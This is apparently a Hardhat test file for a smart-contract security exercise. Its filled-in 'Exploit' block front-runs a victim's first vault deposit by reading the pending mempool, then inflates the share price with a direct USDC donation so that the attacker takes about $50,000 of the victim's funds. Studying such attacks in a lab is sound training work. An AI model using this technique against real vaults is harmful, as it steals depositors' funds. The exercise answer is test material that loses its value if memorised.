import {ethers} from 'hardhat';
import {expect} from 'chai';
import {SignerWithAddress} from '@nomicfoundation/hardhat-ethers/signers';
import {IERC20, OptimizerStrategy, OptimizerVault, YieldContract} from '../../typechain-types';
import {BigNumber} from '@ethersproject/bignumber';

const {provider, deployContract, getSigners, parseEther, parseUnits} = ethers;

/**
 * @dev run "npx hardhat test test/optimizer-vaults-1/tests.ts"
 */
describe('Optimizer Vaults 101: Exercise 1', () => {
  /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

  let deployer: SignerWithAddress, attacker: SignerWithAddress, bob: SignerWithAddress;

  const ATTACKER_USDC_BALANCE = parseUnits('100000', 6) + 1n; // Attacker has 100,000 + 1 wei USDC
  const BOB_USDC_BALANCE = parseUnits('200000', 6); // Bob has 200,000 USDC

  const USDC_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  const WHALE_ADDRESS = '0xf977814e90da44bfa03b6295a0616a897441acec';

  let yieldContract: YieldContract;
  let strategy: OptimizerStrategy;
  let vault: OptimizerVault;
  let usdc: IERC20;

  before(async () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
    [deployer, attacker, bob] = await getSigners();

    // Whale impersonation
    const whaleSigner = await ethers.getImpersonatedSigner(WHALE_ADDRESS);

    // Set attacker, bob, & whale balance to 2 ETH
    await provider.send('hardhat_setBalance', [
      attacker.address,
      '0x1BC16D674EC80000', // 2 ETH (ETH -> WEI -> Hexdecimal)
    ]);
    await provider.send('hardhat_setBalance', [
      whaleSigner.address,
      '0x1BC16D674EC80000', // 2 ETH (ETH -> WEI -> Hexdecimal)
    ]);
    await provider.send('hardhat_setBalance', [
      bob.address,
      '0x1BC16D674EC80000', // 2 ETH (ETH -> WEI -> Hexdecimal)
    ]);
    // Load tokens
    usdc = (await ethers.getContractAt(
      '@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20',
      USDC_ADDRESS,
    )) as unknown as IERC20;
    // Deploy the vault system
    yieldContract = await deployContract('YieldContract', [USDC_ADDRESS]);
    strategy = await deployContract('OptimizerStrategy', [yieldContract.target]);
    vault = await deployContract('OptimizerVault', [strategy.target, 'VAULT', 'VLT']);

    // Transfer USDC to the attacker & bob
    await usdc.connect(whaleSigner).transfer(attacker.address, ATTACKER_USDC_BALANCE);
    await usdc.connect(whaleSigner).transfer(bob.address, BOB_USDC_BALANCE);

    // Assign the vault to the strategy
    await strategy.setVault(vault.target);

    // Approve the vault for the attacker & bob
    await usdc.connect(attacker).approve(vault.target, ATTACKER_USDC_BALANCE);
    await usdc.connect(bob).approve(vault.target, BOB_USDC_BALANCE);

    // Bob initiates a tx to be the first depositor in the vault system
    await vault.connect(bob).deposit(BOB_USDC_BALANCE);
  });

  it('Exploit', async () => {
    /** CODE YOUR SOLUTION HERE */
    const {transactions: pendingTxs} = await ethers.provider.send('eth_getBlockByNumber', ['pending', true]);

    // TODO: You see that Bob is going to be firsst depositor in the vault with 200k USDC, find this Tx
    const bobsDepositTx = pendingTxs.find((tx: any) => tx.to === vault.target.toString().toLowerCase());
    const bobsGasPrice = bobsDepositTx.gasPrice;

    // TODO: You front run bob so that you are the first depositor
    await vault.connect(attacker).deposit(1, {
      gasPrice: BigNumber.from(bobsGasPrice).add(1).toBigInt(),
      gasLimit: BigNumber.from(bobsDepositTx.gas).add(1).toBigInt(),
    });

    // TODO: You do something sneaky that allows you to take some of bob's funds!
    await usdc.connect(attacker).transfer(vault.target, parseUnits('100000', 6), {
      gasPrice: BigNumber.from(bobsGasPrice).add(1).toBigInt(),
    });

    // Mine some blocks, don't change this line
    await provider.send('evm_mine', []);
    /** CODE YOUR SOLUTION HERE */

    let attackerVaultBalance = BigNumber.from(await vault.balanceOf(attacker.address));
    await vault.connect(attacker).withdraw(attackerVaultBalance.toBigInt());
  });

  after(async () => {
    /** SUCCESS CONDITIONS */
    await provider.send('evm_mine', []);
    // Attacker realizes at least $48,000 USDC gain
    expect(await usdc.balanceOf(attacker.address)).is.gt(ATTACKER_USDC_BALANCE + parseUnits('48000', 6));
    // Bob withdraws his vault balance
    const bobVaultBalance = await vault.balanceOf(bob.address);
    await vault.connect(bob).withdraw(bobVaultBalance);
    // Bob loses roughly $50,000 USDC when he withdraws
    expect(await usdc.balanceOf(bob.address)).is.lt(BOB_USDC_BALANCE - parseUnits('49000', 6));
  });
});
